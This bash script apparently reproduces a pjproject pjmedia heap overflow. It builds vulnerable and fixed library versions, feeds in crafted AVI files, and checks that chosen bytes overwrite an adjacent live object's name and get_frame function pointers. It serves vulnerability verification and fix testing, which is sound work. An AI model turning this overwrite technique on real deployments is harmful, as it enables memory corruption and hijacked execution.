#!/usr/bin/env bash
# Adjacent REAL library object replay: frame from the real pj pool, followed
# by a live pjmedia_port created by pjmedia_bidirectional_port_create() from
# that same pool.  No ASan redzone exists inside the pool block, so the
# proof is readback of chosen bytes in the live library object.
set -u
cd "$(dirname "$0")/.."

T=x86_64-pc-linux-gnu
VULN=src/full/pjproject-c1ea7648fb53f945493972a23133b9e0d3e4a1fe
FIXED=src/full/pjproject-7ecc6584969a923c4190b6912afbf5952b5a4b9f
PASS=0
FAIL=0

compile() {
    name=$1; root=$2
    gcc -fsanitize=address -g -O0 -fno-omit-frame-pointer \
        -DPJ_AUTOCONF=1 -DPJMEDIA_HAS_VIDEO=1 \
        -I"$root/pjlib/include" -I"$root/pjlib-util/include" \
        -I"$root/pjmedia/include" -I"$root/pjnath/include" \
        -I"$root/pjsip/include" real/real-driver.c -o "real/driver-$name" \
        -Wl,--start-group \
        "$root/pjmedia/lib/libpjmedia-$T.a" \
        "$root/pjmedia/lib/libpjmedia-videodev-$T.a" \
        "$root/pjmedia/lib/libpjmedia-codec-$T.a" \
        "$root/pjmedia/lib/libpjsdp-$T.a" \
        "$root/pjnath/lib/libpjnath-$T.a" \
        "$root/pjlib-util/lib/libpjlib-util-$T.a" \
        "$root/pjlib/lib/libpj-$T.a" -Wl,--end-group -lm -pthread -luuid
    echo "COMPILE $name rc=$?"
}

run() {
    name=$1; avi=$2; log=$3
    mkdir -p "real/out-$name"
    ASAN_OPTIONS=detect_leaks=0:symbolize=1 \
        "./real/driver-$name" "real/$avi" realobj > "real/out-$name/$log" 2>&1
    rc=$?
    echo "RUN $name $avi realobj rc=$rc log=real/out-$name/$log"
    grep -E -m1 'REALOBJ|VICTIM_BEFORE|PULL_DONE|VICTIM_AFTER|VICTIM_BYTES_AFTER|ERROR: AddressSanitizer' \
        "real/out-$name/$log" || true
}

check() {
    label=$1; file=$2; pattern=$3
    if grep -q "$pattern" "$file"; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (missing: $pattern)"
        FAIL=$((FAIL + 1))
    fi
}
check_same() {
    label=$1; file=$2
    fields_before=$(grep -m1 '^VICTIM_BEFORE ' "$file" || true)
    fields_after=$(grep -m1 '^VICTIM_AFTER ' "$file" || true)
    bytes_before=$(grep -m1 '^VICTIM_BYTES_BEFORE:' "$file" || true)
    bytes_after=$(grep -m1 '^VICTIM_BYTES_AFTER:' "$file" || true)
    if [ -n "$fields_before" ] && [ "${fields_before#VICTIM_BEFORE }" = "${fields_after#VICTIM_AFTER }" ] \
       && [ "${bytes_before#VICTIM_BYTES_BEFORE:}" = "${bytes_after#VICTIM_BYTES_AFTER:}" ]; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (victim fields or bytes changed)"
        FAIL=$((FAIL + 1))
    fi
}

python3 real/make_avi.py real/attack64.avi 64
python3 real/make_avi.py real/attack512.avi 512
python3 real/make_avi.py real/safe48.avi 48

compile vuln "$VULN"
run vuln attack64.avi    realobj-vuln-attack64.log
run vuln attack512.avi   realobj-vuln-attack512.log
run vuln safe48.avi      realobj-vuln-safe48.log

compile fixed "$FIXED"
run fixed attack64.avi   realobj-fixed-attack64.log
run fixed safe48.avi      realobj-fixed-safe48.log

V=real/out-vuln
F=real/out-fixed
check 'victim adjacent'              "$V/realobj-vuln-attack64.log"  'delta=48'
check 'vuln attack64 chosen bytes'   "$V/realobj-vuln-attack64.log"  'VICTIM_BYTES_AFTER:4d495348452d504a50524f4a45435421'
check 'vuln attack64 name ptr'       "$V/realobj-vuln-attack64.log"  'VICTIM_AFTER name=0x4a502d454853494d'
check 'vuln attack64 pull'           "$V/realobj-vuln-attack64.log"  'PULL_DONE status=0'
check 'vuln attack512 chosen bytes'  "$V/realobj-vuln-attack512.log" 'VICTIM_BYTES_AFTER:4d495348452d504a50524f4a45435421'
check 'vuln attack512 get_frame'     "$V/realobj-vuln-attack512.log" 'get=0x215443454a4f5250'
check 'vuln attack512 frame.size'    "$V/realobj-vuln-attack512.log" 'PULL_DONE status=0 frame.size=512'
check_same 'vuln safe unchanged'     "$V/realobj-vuln-safe48.log"
check 'fixed clamp logged'           "$F/realobj-fixed-attack64.log" 'exceeds frame buffer (48), truncating'
check_same 'fixed attack64 unchanged' "$F/realobj-fixed-attack64.log"
check_same 'fixed safe unchanged'     "$F/realobj-fixed-safe48.log"

echo "TOTAL: $PASS PASS / $FAIL FAIL"
echo "== hashes =="
sha256sum real/real-driver.c real/run-realobj.sh real/attack64.avi real/attack512.avi real/safe48.avi
